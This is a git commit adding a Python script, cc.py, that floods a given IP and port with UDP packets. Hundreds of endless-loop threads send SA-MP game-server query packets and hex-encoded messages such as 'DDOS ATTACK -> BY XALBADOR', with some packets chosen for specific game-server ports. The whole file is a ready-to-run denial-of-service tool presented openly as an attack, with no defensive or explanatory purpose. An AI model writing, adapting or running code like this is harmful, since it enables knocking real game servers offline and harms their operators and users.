e700fca17bd03a50bbf10aebaac1a47589993b1f
iauawhwjuwhenwhwa <123171566+iauawhwjuwhenwhwa@users.noreply.github.com>
2023-01-23 22:29:51 +0700

    Create cc.py

---
+++ cc.py
@@ -0,0 +1,123 @@
+import socket
+import struct
+import codecs,sys
+import threading
+import random
+import time
+import os
+
+
+
+
+ip = sys.argv[1]
+port = sys.argv[2]
+orgip =ip
+
+Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
+                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
+                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#u
+                       codecs.decode("44444f532041545441434b202d3e2042592058414c4241444f52202d3e2053454e44","hex_codec"),#i
+                       codecs.decode("544845204a4159202d3e2041545441434b202d3e20534552564552","hex_codec"),#u
+                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
+                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
+                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
+                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
+                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
+                       codecs.decode("021efd40","hex_codec"),#cookie port 1111
+                       codecs.decode("35342c38302c3232","hex_codec"),#cookie port 7771 
+                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
+                       ]
+
+os.system("clear")
+print("\033[0;37;41mAttack to ip %s and port %s"%(orgip,port))
+
+
+
+class MyThread(threading.Thread):
+     def run(self):
+         while True:
+                sock = socket.socket(
+                    socket.AF_INET, socket.SOCK_DGRAM)
+                
+                msg = Pacotes[random.randrange(0,3)]
+                     
+                sock.sendto(msg, (ip, int(port)))
+                
+                
+                if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                elif(int(port) == 1111):
+                    sock.sendto(Pacotes[9], (ip, int(port)))
+                elif(int(port) == 7778):
+                    sock.sendto(Pacotes[8], (ip, int(port)))    
+
+class MyThread1(threading.Thread):
+     def run(self):
+         while True:
+                sock = socket.socket(
+                    socket.AF_INET, socket.SOCK_DGRAM)
+                
+                msg = Pacotes[random.randrange(0,3)]
+                     
+                sock.sendto(msg, (ip, int(port)))
+                
+                
+                if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                elif(int(port) == 1111):
+                    sock.sendto(Pacotes[9], (ip, int(port)))
+                elif(int(port) == 7778):
+                    sock.sendto(Pacotes[8], (ip, int(port)))    
+
+class MyThread2(threading.Thread):
+     def run(self):
+         while True:
+                sock = socket.socket(
+                    socket.AF_INET, socket.SOCK_DGRAM)
+                
+                msg = Pacotes[random.randrange(0,3)]
+                     
+                sock.sendto(msg, (ip, int(port)))
+                
+                
+                if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                elif(int(port) == 1111):
+                    sock.sendto(Pacotes[9], (ip, int(port)))
+                elif(int(port) == 7778):
+                    sock.sendto(Pacotes[8], (ip, int(port)))
+
+                                                                   
+if __name__ == '__main__':
+    try:
+     for x in range(125):                                    
+            mythread = MyThread()
+            mythread1 = MyThread1()
+            mythread2 = MyThread2()
+            mythread1.start()
+            mythread2.start()
+            mythread.start()
+            time.sleep(.1)    
+    except(KeyboardInterrupt):
+         os.system('cls' if os.name == 'nt' else 'clear')
+         
+         print("Close")
+         pass
